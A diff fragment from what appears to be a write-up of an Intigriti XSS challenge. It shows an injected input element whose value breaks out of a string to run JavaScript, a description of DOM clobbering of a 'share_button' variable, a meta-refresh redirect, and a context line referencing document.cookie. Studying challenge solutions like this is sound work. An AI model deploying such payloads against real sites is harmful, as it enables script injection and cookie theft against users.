@@ -736,7 +736,9 @@ body:document.cookie
 <input form=comment-form name=tags value='a");alert(document.getElementsByClassName("navbar-brand")[0].innerText)//'>
 ```  
 
->This target is exploited by constructing an HTML injection that clobbers a variable named `share_button` and uses XSS code above. The content is reflected on the page, then using `meta http-equiv` tag to refresh page after 1 second result in redirecting to `/edit`.  
+>This target is exploited by constructing an HTML injection that clobbers a variable named `share_button`, see `source code` below and uses XSS code above. The content is reflected on the page, then using `meta http-equiv` tag to refresh page after 1 second result in redirecting to `/edit`.  
+
+![clobbering javascript variable](images/clobbering5.png)  
 
 ```
 https://challenge-1222.intigriti.io/blog/unique-guid-value-abc123?share=1
